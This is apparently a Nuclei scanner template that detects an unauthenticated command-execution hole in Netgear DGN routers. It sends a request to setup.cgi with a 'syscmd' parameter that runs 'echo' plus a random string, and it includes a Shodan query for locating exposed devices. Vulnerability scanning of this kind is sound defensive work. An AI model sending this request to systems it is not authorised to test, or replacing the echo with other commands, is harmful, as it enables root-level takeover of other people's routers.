http:
- matchers:
  - condition: and
    dsl:
    - contains(body, '{{randstr}}')
    - '!contains(body, ''echo {{randstr}}'')'
    - '!contains(body, ''echo%20{{randstr}}'')'
    - contains(content_type, 'text/plain')
    - status_code== 200
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=echo%20{{randstr}}&curpath=/&currentsetting.htm=1'
id: netgear-dgn-rce
info:
  author: 3th1c_yuk1
  description: 'This template checks for unauthenticated command execution vulnerability
    in Netgear DGN devices. Attackers can bypass authentication mechanisms and execute
    arbitrary commands with root privileges.

    '
  metadata:
    max-request: 1
    shodan-query: NETGEAR DGN
    verified: true
  name: Netgear DGN Devices - Command Execution
  reference:
  - https://www.crowdsec.net/blog/netgear-rce-and-how-vulnerabilities-persist-in-the-wild
  - https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/netgear_dgn1000_setup_unauth_exec.md
  severity: critical
  tags: rce,netgear,dgn,vuln
